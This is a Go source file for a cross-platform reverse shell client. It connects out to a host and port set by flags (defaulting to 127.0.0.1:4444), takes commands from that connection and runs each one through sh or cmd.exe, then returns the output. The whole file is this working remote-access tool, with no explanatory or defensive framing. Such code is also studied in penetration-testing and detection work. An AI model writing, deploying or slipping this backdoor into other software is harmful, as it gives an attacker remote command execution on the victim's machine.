package main

import (
        "bufio"
        "flag"
        "fmt"
        "net"
        "os"
        "os/exec"
        "runtime"
        "strings"
)

const os_version string = runtime.GOOS
const HOST string = "127.0.0.1"
const PORT string = "4444"

func main() {
        host := flag.String("host", HOST, "Host to connect to")
        port := flag.String("port", PORT, "Port to connect to")
        flag.Parse()
        server := *host + ":" + *port
        addr, err := net.ResolveTCPAddr("tcp", server)
        if err != nil {
                fmt.Println(err)
                os.Exit(1)
        }
        conn, err := net.DialTCP("tcp", nil, addr)
        if err != nil {
                fmt.Println(err)
                os.Exit(1)
        }
        for {
                message, err := bufio.NewReader(conn).ReadString('\n')
                if err != nil {
                        fmt.Println("Error: ", err)
                }
                results := exec_cmd(message)
                conn.Write(results)
        }
}

func exec_cmd(cmd string) []byte {
        parts := strings.Fields(cmd)
        head := parts[0]
        parts = parts[1:len(parts)]
        switch head {
        case "exit":
                os.Exit(0)
        case "cd":
                os.Chdir(parts[0])
                return []byte("dir chaged")
        default:
                if os_version != "windows" {
                        out, err := exec.Command("sh", "-c", cmd).Output()
                        if err != nil {
                                return []byte("command not found")
                        }
                        return out
                } else {
                        out, err := exec.Command("cmd.exe", "/c", cmd).Output()
                        if err != nil {
                                return []byte("command not found")
                        }
                        return out
                }
        }
        return nil
}
